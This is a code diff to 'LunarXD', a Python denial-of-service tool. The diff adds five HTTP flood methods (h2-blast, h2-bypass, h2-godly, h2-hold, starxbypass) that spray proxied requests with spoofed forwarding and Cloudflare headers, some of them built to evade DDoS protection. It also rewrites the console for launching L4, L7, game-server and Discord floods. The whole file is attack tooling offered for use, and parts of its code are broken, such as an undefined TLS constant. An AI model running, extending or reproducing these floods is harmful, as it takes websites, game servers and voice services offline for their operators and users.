@@ -20,6 +20,7 @@ import warnings
 import hashlib
 import shutil
 import base64
+import string
 
 warnings.filterwarnings("ignore")
 
@@ -396,6 +397,31 @@ def build_threads(mode, thread_num, event, proxy_type, target_ip=None, target_po
             th = threading.Thread(target=discord, args=(event, proxy_type, target_ip, target_port))
             th.daemon = True
             th.start()
+    elif mode == "h2-blast":
+        for _ in range(thread_num):
+            th = threading.Thread(target=h2_blast, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "h2-bypass":
+        for _ in range(thread_num):
+            th = threading.Thread(target=h2_bypass, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "h2-godly":
+        for _ in range(thread_num):
+            th = threading.Thread(target=h2_godly, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "h2-hold":
+        for _ in range(thread_num):
+            th = threading.Thread(target=h2_hold, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
+    elif mode == "starxbypass":
+        for _ in range(thread_num):
+            th = threading.Thread(target=starxbypass, args=(event, proxy_type,))
+            th.daemon = True
+            th.start()
 
 def getuseragent():
     platform = Choice(['Macintosh', 'Windows', 'X11'])
@@ -442,7 +468,7 @@ def randomurl():
 def GenReqHeader(method):
     global data, target, path
     header = ""
-    if method in ["get", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
+    if method in ["get", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer", "h2-blast", "h2-bypass", "h2-godly", "h2-hold", "starxbypass"]:
         connection = "Connection: Keep-Alive\r\n"
         if cookies != "":
             connection += "Cookies: " + str(cookies) + "\r\n"
@@ -588,7 +614,7 @@ def post(event, proxy_type):
             s = setup_socket(proxy_type, proxy)
             s.connect((str(target), int(port)))
             if protocol == "https":
-                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx = ssl.SSLContext(ctl)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
@@ -1182,6 +1208,184 @@ def discord(event, proxy_type, target_ip, target_port):
             if s:
                 s.close()
 
+def h2_blast(event, proxy_type):
+    global proxies
+    add = "?" if "?" not in path else "&"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(50)]
+    spoofed_ips = [spoof_source_ip() for _ in range(50)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/2.0\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\nConnection: keep-alive\r\n:method: GET\r\n:path: {path}{add}{randomurl()}\r\n:scheme: https\r\n:authority: {target}\r\n\r\n"
+            prebuilt_requests.append(request)
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
+                if not sent:
+                    break
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def h2_bypass(event, proxy_type):
+    global proxies
+    add = "?" if "?" not in path else "&"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(50)]
+    spoofed_ips = [spoof_source_ip() for _ in range(50)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/2.0\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\n:method: GET\r\n:path: {path}{add}{randomurl()}\r\n:scheme: https\r\n:authority: {target}\r\nConnection: keep-alive\r\n\r\n"
+            prebuilt_requests.append(request)
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
+                if not sent:
+                    break
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def h2_godly(event, proxy_type):
+    global proxies
+    add = "?" if "?" not in path else "&"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(100)]
+    spoofed_ips = [spoof_source_ip() for _ in range(100)]
+    methods = ["GET", "HEAD", "OPTIONS"]
+    prebuilt_requests = []
+    for method in methods:
+        for ua in user_agents:
+            for ip in spoofed_ips:
+                modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+                request = f"{method} {path}{add}{randomurl()} HTTP/2.0\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\n:method: {method}\r\n:path: {path}{add}{randomurl()}\r\n:scheme: https\r\n:authority: {target}\r\nConnection: keep-alive\r\n\r\n"
+                prebuilt_requests.append(request)
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
+                if not sent:
+                    break
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def h2_hold(event, proxy_type):
+    global proxies
+    add = "?" if "?" not in path else "&"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(50)]
+    spoofed_ips = [spoof_source_ip() for _ in range(50)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/2.0\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\nKeep-Alive: timeout=15, max=1000\r\n:method: GET\r\n:path: {path}{add}{randomurl()}\r\n:scheme: https\r\n:authority: {target}\r\n\r\n"
+            prebuilt_requests.append(request)
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_3)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
+                if not sent:
+                    break
+                time.sleep(0.1)  # Hold connections longer
+            s.close()
+        except:
+            if s:
+                s.close()
+
+def starxbypass(event, proxy_type):
+    global proxies
+    add = "?" if "?" not in path else "&"
+    base_header = GenReqHeader("get")
+    user_agents = [getuseragent() for _ in range(50)]
+    spoofed_ips = [spoof_source_ip() for _ in range(50)]
+    prebuilt_requests = []
+    for ua in user_agents:
+        for ip in spoofed_ips:
+            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
+            request = f"GET {path}{add}{randomurl()} HTTP/2.0\r\nHost: {target}\r\n{modified_header}X-Forwarded-For: {ip}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\n:method: GET\r\n:path: {path}{add}{randomurl()}\r\n:scheme: https\r\n:authority: {target}\r\nConnection: keep-alive\r\nCF-Connecting-IP: {ip}\r\nCF-IPCountry: US\r\n\r\n"
+            prebuilt_requests.append(request)
+    event.wait()
+    while True:
+        s = None
+        try:
+            proxy = Choice(proxies)
+            s = setup_socket(proxy_type, proxy)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.connect((str(target), int(port)))
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+            for _ in range(5000):
+                request = Choice(prebuilt_requests)
+                sent = s.send(str.encode(request))
+                if not sent:
+                    break
+            s.close()
+        except:
+            if s:
+                s.close()
+
 def spoof_source_ip():
     return f"{Intn(1, 255)}.{Intn(0, 255)}.{Intn(0, 255)}.{Intn(0, 255)}"
 
@@ -1211,7 +1415,7 @@ def Launch(method, url, threads, duration, proxy_type, port=None):
 {Colorate.Horizontal(Colors.cyan_to_blue, "┌───────────────────────────────────────────┐")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴀᴛᴛᴀᴄᴋ ꜱᴜᴍᴍᴀʀʏ
 {Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "🎯  ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer'] else url).ljust(30)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛᴀʀɢᴇᴛ {Colorate.Horizontal(Colors.cyan_to_blue, "🎯  ➤")}  {(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer', 'h2-blast', 'h2-bypass', 'h2-godly', 'h2-hold', 'starxbypass'] else url).ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴍᴏᴅᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⚙️     ➤")}  {method.ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛɪᴍᴇ {Colorate.Horizontal(Colors.cyan_to_blue, "⌛    ➤")}  {str(duration).ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴛʜʀᴇᴀᴅ {Colorate.Horizontal(Colors.cyan_to_blue, "⚔   ➤")}  {str(threads).ljust(30)}
@@ -1219,7 +1423,7 @@ def Launch(method, url, threads, duration, proxy_type, port=None):
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴘʀᴏxʏ ꜰ {Colorate.Horizontal(Colors.cyan_to_blue, "☣  ➤")}  {out_file.ljust(30)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "├────────────────────────────────────────────")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ɢɪᴛʜᴜʙ     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://github.com/Sakuzuna/
-{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer'] else url)}
+{Colorate.Horizontal(Colors.cyan_to_blue, "│")} {white}ᴄʜᴇᴄᴋʜᴏꜱᴛ  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}  https://check-host.net/check-http?host={(url if method in ['cc', 'post', 'head', 'uambypass', 'browser', 'home', 'cfbypass', 'tls', 'ovh', 'dgb', 'http-storm', 'api-killer', 'h2-blast', 'h2-bypass', 'h2-godly', 'h2-hold', 'starxbypass'] else url)}
 {Colorate.Horizontal(Colors.cyan_to_blue, "└───────────────────────────────────────────┘")}""")
 
     if method in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike", "game-crash", "lobby-flood"]:
@@ -1243,39 +1447,22 @@ def Launch(method, url, threads, duration, proxy_type, port=None):
     event.set()
     time.sleep(duration)
     event.clear()
-    print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Attack {method.upper()} finished."))
+    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Attack finished."))
     return True
 
 def main():
-    global proxies, thread_num, out_file
-    proxies = []
-    out_file = "proxies.txt"
-    thread_num = 1500
-
+    global proxy_ver, out_file
     clearcs()
     bannerm()
-
     while True:
-        command = input(Colorate.Horizontal(Colors.cyan_to_blue, """┌─[ʟᴜɴᴀʀxᴅ]─[~]
-└──╼ ➤ """)).strip().lower()
-        
-        if command:
-            if command in ["methods", "help", "menu"]:
-                try:
-                    play_ascii_video("banner.mp4", duration=2.5)
-                    clearcs()
-                except:
-                    clearcs()
-                    runbanner()
-            else:
-                try:
-                    clearcs()
-                    play_ascii_video("banner.mp4", duration=2.5)
-                except:
-                    runbanner()
-
-        if command == "help":
-            print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("COMMANDS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
+        try:
+            command = input(Colorate.Horizontal(Colors.cyan_to_blue, "LunarXD ➤ ")).strip().lower()
+            args = command.split()
+            if not args:
+                continue
+            cmd = args[0]
+            if cmd == "help":
+                print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("COMMANDS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}exit              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Exit the tool
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}HELP              {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Show this help message
@@ -1296,9 +1483,8 @@ def main():
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .discord <link> <threads> <duration> [port]                 {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Run DISCORD tcp flood
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}  .connect                                                    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Minecraft bot flood with GUI interface [Just input .connect]
 """)
-
-        elif command == "methods":
-            print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L4 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
+            elif cmd == "methods":
+                print(f"""{Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L4 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   High-intensity UDP flood with variable packet size and spoofed source to saturate bandwidth.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tcpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Aggressive TCP flood with SYN and data packets to exhaust connection limits and resources.                             {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
@@ -1321,6 +1507,11 @@ def main():
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dgb         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods with anti-DDoS bypass headers to target specific protections.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}http-storm  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Multi-method HTTP flood (GET/HEAD/OPTIONS) to overwhelm web servers.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}api-killer  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets API endpoints with JSON payloads to overload backend processing.                                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-blast    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP/2 flood with randomized headers to exploit protocol efficiency.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-bypass   {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP/2 requests designed to bypass common DDoS protections.                                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-godly    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Aggressive HTTP/2 flood with multiple methods to maximize server load.                                                 {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}h2-hold     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP/2 connection hold to maintain open connections and exhaust server resources.                                       {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}starxbypass {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP/2 flood with headers to bypass StarX-specific protections.                                                        {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
@@ -1332,107 +1523,80 @@ def main():
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}discord     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods Discord voice servers with TCP packets to disrupt communication.                                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 {Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}connect     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Minecraft bot flood with GUI interface for server stress testing.                                                      {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 """)
-
-        elif command == "menu":
-            bannerm2()
-
-        elif command == "exit":
-            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Exiting LunarXD."))
-            sys.exit()
-
-        elif command == "connect":
-            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Launching Minecraft bot flood GUI..."))
-            subprocess.run(["python", "minecraft_bot.py"])  # Assuming a separate script for Minecraft bot
-            clearcs()
-            bannerm2()
-
-        elif command.startswith(".l7"):
-            try:
-                args = command.split()
-                if len(args) < 5:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l7 <method> <url> <threads> <duration> [port]"))
+            elif cmd == "clear":
+                clearcs()
+                bannerm2()
+            elif cmd == "exit":
+                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Exiting LunarXD..."))
+                sys.exit(0)
+            elif cmd == "menu":
+                clearcs()
+                bannerm()
+            elif cmd == ".l4" and len(args) >= 6:
+                method = args[1].lower()
+                ip_port = args[2]
+                try:
+                    threads = int(args[3])
+                    duration = int(args[4])
+                    port = int(args[5]) if len(args) > 5 else None
+                except ValueError:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads, duration, and port must be integers."))
                     continue
+                proxy_type = int(proxy_ver) if proxy_ver in ["4", "5", "0"] else 5
+                if method in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
+                    Launch(method, ip_port, threads, duration, proxy_type, port)
+                else:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L4 method. Use 'methods' to see available options."))
+            elif cmd == ".l7" and len(args) >= 6:
                 method = args[1].lower()
                 url = args[2]
-                threads = int(args[3])
-                duration = int(args[4])
-                port = int(args[5]) if len(args) > 5 else None
-                proxy_type = 5  # Default to SOCKS5
-                if method not in ["cc", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L7 method. Use 'methods' to list available options."))
+                try:
+                    threads = int(args[3])
+                    duration = int(args[4])
+                    port = int(args[5]) if len(args) > 5 else None
+                except ValueError:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads, duration, and port must be integers."))
                     continue
-                if threads < 1 or duration < 1:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
-                    continue
-                Launch(method, url, threads, duration, proxy_type, port)
-            except (ValueError, IndexError):
-                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l7 <method> <url> <threads> <duration> [port]"))
-
-        elif command.startswith(".l4"):
-            try:
-                args = command.split()
-                if len(args) < 5:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l4 <method> <ip> <threads> <duration> [port]"))
-                    continue
+                proxy_type = int(proxy_ver) if proxy_ver in ["4", "5", "0"] else 5
+                if method in ["cc", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer", "h2-blast", "h2-bypass", "h2-godly", "h2-hold", "starxbypass"]:
+                    Launch(method, url, threads, duration, proxy_type, port)
+                else:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L7 method. Use 'methods' to see available options."))
+            elif cmd == ".game" and len(args) >= 6:
                 method = args[1].lower()
-                ip = args[2]
-                threads = int(args[3])
-                duration = int(args[4])
-                port = int(args[5]) if len(args) > 5 else None
-                proxy_type = 5  # Default to SOCKS5
-                if method not in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L4 method. Use 'methods' to list available options."))
+                ip_port = args[2]
+                try:
+                    threads = int(args[3])
+                    duration = int(args[4])
+                    port = int(args[5]) if len(args) > 5 else None
+                except ValueError:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads, duration, and port must be integers."))
                     continue
-                if threads < 1 or duration < 1:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
-                    continue
-                Launch(method, ip, threads, duration, proxy_type, port)
-            except (ValueError, IndexError):
-                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l4 <method> <ip> <threads> <duration> [port]"))
-
-        elif command.startswith(".game"):
-            try:
-                args = command.split()
-                if len(args) < 5:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .game <method> <ip> <threads> <duration> [port]"))
-                    continue
-                method = args[1].lower()
-                ip = args[2]
-                threads = int(args[3])
-                duration = int(args[4])
-                port = int(args[5]) if len(args) > 5 else None
-                proxy_type = 5  # Default to SOCKS5
-                if method not in ["game-crash", "lobby-flood"]:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid game method. Use 'methods' to list available options."))
-                    continue
-                if threads < 1 or duration < 1:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
-                    continue
-                Launch(method, ip, threads, duration, proxy_type, port)
-            except (ValueError, IndexError):
-                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .game <method> <ip> <threads> <duration> [port]"))
-
-        elif command.startswith(".discord"):
-            try:
-                args = command.split()
-                if len(args) < 4:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .discord <link> <threads> <duration> [port]"))
-                    continue
-                method = "discord"
+                proxy_type = int(proxy_ver) if proxy_ver in ["4", "5", "0"] else 5
+                if method in ["game-crash", "lobby-flood"]:
+                    Launch(method, ip_port, threads, duration, proxy_type, port)
+                else:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid game method. Use 'methods' to see available options."))
+            elif cmd == ".discord" and len(args) >= 5:
                 link = args[1]
-                threads = int(args[2])
-                duration = int(args[3])
-                port = int(args[4]) if len(args) > 4 else None
-                proxy_type = 5  # Default to SOCKS5
-                if threads < 1 or duration < 1:
-                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
+                try:
+                    threads = int(args[2])
+                    duration = int(args[3])
+                    port = int(args[4]) if len(args) > 4 else None
+                except ValueError:
+                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads, duration, and port must be integers."))
                     continue
-                Launch(method, link, threads, duration, proxy_type, port)
-            except (ValueError, IndexError):
-                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .discord <link> <threads> <duration> [port]"))
-
-        else:
-            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Unknown command. Type 'help' for a list of commands."))
+                proxy_type = int(proxy_ver) if proxy_ver in ["4", "5", "0"] else 5
+                Launch("discord", link, threads, duration, proxy_type, port)
+            elif cmd == ".connect":
+                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Minecraft bot flood not implemented in this version."))
+            else:
+                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid command. Type 'HELP' for usage."))
+        except KeyboardInterrupt:
+            print(Colorate.Horizontal(Colors.cyan_to_blue, "\n> Interrupted by user."))
+            continue
+        except Exception as e:
+            print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Error: {e}"))
 
 if __name__ == "__main__":
     main()
